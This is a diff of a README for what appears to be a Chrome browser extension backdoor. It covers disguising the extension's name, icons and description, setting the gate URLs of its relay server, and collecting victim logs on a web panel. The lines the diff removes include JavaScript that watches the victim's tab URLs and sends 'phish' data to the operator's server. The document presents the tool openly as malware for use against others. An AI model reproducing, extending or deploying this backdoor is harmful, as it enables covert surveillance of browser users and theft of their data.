@@ -1,3 +1,9 @@
+![Chrome browser backdoor](http://img15.hostingpics.net/pics/394637logoback.png)
+
+## Network
+
+Backdoor => Relais => Web Panel
+
 ![backdoor Chrome](http://s9.postimg.org/vvo5ncxy7/chrome.png)
 
 ## Change name, icones, description
@@ -6,7 +12,12 @@ change it on manifest
 
 ![Backdoor chrome](http://s15.postimg.org/yf0rmsfuj/rename.png)
 
-## Change Gate
+## Change Gate on script
+
+js/check.js
+
+web : show.php
+
 ```JavaScript
     var server_web = "http://localhost:8888/"
     var lock_page = "relais/lock.php"
@@ -19,32 +30,12 @@ Update lock page with 1
 
 ![Backdoor lock](http://s27.postimg.org/vahc0lb8z/lock.png)
 
-## Check URL
-( js/check.js )
-```JavaScript
-    // VERIFIED D'URL
-    if(tabURL.indexOf('') !== -1 ) // url in ''
-    {
-        Payload_exemple();
-    }
-```
+## Url checker & Payload 
 
-## Create payload
-( js/check.js )
-```JavaScript
-    // PAYLOAD FUNCTION NEED HTTPS
-    function Payload_exemple()
-    {
-        console.log('Injected here')
-        var urls = "" // Var for URL
-        var phish = "" // Var for logs 
-        $.get(server_web+gate_page, { info: phish, url: urls } );
-    }
-```
+Make it on webpanel
 
-## Go to web relais
+![backdoor chrome panel](http://img15.hostingpics.net/pics/130725Capturedecran20160114a112508.png)
 
-```shell
-Url = 
-Login = 
-```
+## Get the log here
+
+![backdoor chrome panel](http://img15.hostingpics.net/pics/277755panelback.png)
